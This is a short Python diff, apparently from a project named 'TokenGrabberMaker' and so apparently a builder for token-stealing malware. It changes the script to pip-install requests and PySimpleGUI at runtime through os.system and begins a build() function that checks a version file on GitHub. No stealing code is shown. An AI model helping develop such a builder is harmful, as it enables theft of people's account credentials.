@@ -1,11 +1,21 @@
 # coding: utf-8
-import requests
-import PySimpleGUI as sg
 import os
 import shutil
 import time
 import ctypes
 import sys
+try:
+    import requests
+except:
+    print("Installation du module requests en cours...")
+    os.system(f"{sys.executable} -m pip install requests")
+    import requests
+try:
+    import PySimpleGUI as sg
+except:
+    print("Installation du module PySimpleGUI en cours...")
+    os.system(f"{sys.executable} -m pip install pysimplegui")
+    import PySimpleGUI as sg
 
 def build():
     version = requests.get("https://raw.githubusercontent.com/Teobre/TokenGrabberMaker/main/Files/version")
